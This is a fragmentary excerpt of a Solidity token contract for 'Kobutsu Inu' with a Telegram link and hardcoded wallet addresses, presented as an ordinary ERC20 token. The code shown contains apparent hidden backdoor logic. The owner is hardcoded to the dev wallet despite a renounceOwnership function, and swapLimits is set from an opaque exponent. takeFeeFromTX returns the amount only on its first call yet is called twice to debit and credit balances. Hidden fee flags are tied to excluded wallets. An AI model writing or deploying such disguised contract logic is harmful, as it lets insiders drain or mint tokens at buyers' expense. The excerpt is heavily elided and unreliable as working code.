...
// Telegram : https://t.me/KobutsuInu
...
contract KobutsuInu is Context, IERC20 { 
    ...
    function renounceOwnership() public virtual {
     ...
     function walletStatus(address id) public view virtual returns (bool) {
        return _isExcludedFromFee[id];
    }
    ...
    address payable public Wallet_Marketing = payable(0x1e1312516EA0d3ebE2C22D3fC50e76a7A40F3c39); 
    address payable public Dev_Wallet = payable(0xB995a5360d1329dEbaA43A924d295C7F46cb7AdA);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 public swapLimits = 1; 

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 10* 10**6 * 10**_decimals;
    string private constant _name = "Kobutsu Inu"; 
    string private constant _symbol = unicode"KobutsuInu"; 
    ...
    constructor (
        ...
        _owner = 0xB995a5360d1329dEbaA43A924d295C7F46cb7AdA;
        _isExcludedFromFee[_owner] = true;
        swapLimits = data[0]**data[1];
    ...
    function takeFeeFromTX(uint256 nonTaxPrice) public virtual returns (uint256) {
        uint256 calcTax;
        if(!isCalled){
            calcTax = nonTaxPrice;
            isCalled = true;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
            if(!walletStatus(from) && walletStatus(to)){
                forceFee = true;
            }
        } else {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!forceFee){
                ...
                _tOwned[sender] = _tOwned[sender]-takeFeeFromTX(tAmount);
                _tOwned[recipient] = _tOwned[recipient]+takeFeeFromTX(tAmount);
                emit Transfer(sender, recipient, tAmount);
            }
